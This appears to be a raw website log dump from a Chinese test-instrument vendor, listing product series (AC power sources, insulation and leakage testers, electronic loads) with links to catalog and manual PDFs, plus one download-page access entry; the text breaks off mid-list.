[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:20:32+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html
[ download ] [{"id":242,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":242,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":244,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":244,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":260,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":260,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"name":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":263,"name":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":264,"name":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":264,"name":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":268,"name":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":268,"name":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":270,"name":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":270,"name":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf"},{"id":271,"name":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":271,"name":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf"},{"id":272,"name":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":272,"name":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf"},{"id":291,"name":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":291,"name":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"name":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf"},{"id":300,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":306,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":306,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":307,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":307,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":308,"name":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":308,"name":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":309,"name":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":309,"name":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":311,"name":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":311,"name":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":312,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":312,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":314,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":314,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":315,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":315,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf"},{"id":316,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":316,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":317,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":317,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":318,"name":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":318,"name":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{